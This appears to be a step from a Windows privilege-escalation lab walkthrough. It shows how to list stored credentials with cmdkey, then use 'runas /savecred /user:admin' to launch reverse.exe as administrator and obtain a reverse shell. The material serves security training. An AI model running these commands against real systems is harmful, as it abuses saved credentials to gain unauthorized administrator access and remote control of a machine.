# 🐾 Task 10: Passwords - Stored Credentials
---

## 📜 Task Description
In this task, we will work with stored credentials in Windows. We will extract the list of stored credentials using the `cmdkey /list` command. If credentials for the "admin" user are not present, we will run a script to add them. Then, we will use these credentials to execute the `reverse.exe` file with administrator privileges.

## 🔍 Step 1: Checking Stored Credentials
First, check the list of stored credentials on the machine using the following command:  
`cmdkey /list`

### 📋 Expected Output
- Confirm that credentials for the `admin` user are stored. If they are missing, proceed to the next step.

## 🔑 Step 2: Updating Stored Credentials
If credentials for the `admin` user are missing, run the `savecred.bat` script to update them. Execute the following command:  
`C:\PrivEsc\savecred.bat`

### 📋 Expected Output
- Confirm that the script successfully updated the stored credentials.

## 📝 Step 3: Executing `reverse.exe` with Administrator Privileges
Now, use the `runas` command with stored credentials to execute the `reverse.exe` file with administrator privileges. Run the following command:  
`runas /savecred /user:admin C:\PrivEsc\reverse.exe`

### 📋 Expected Output
- Confirm that the `reverse.exe` file executed successfully with administrator privileges and you received a reverse shell.
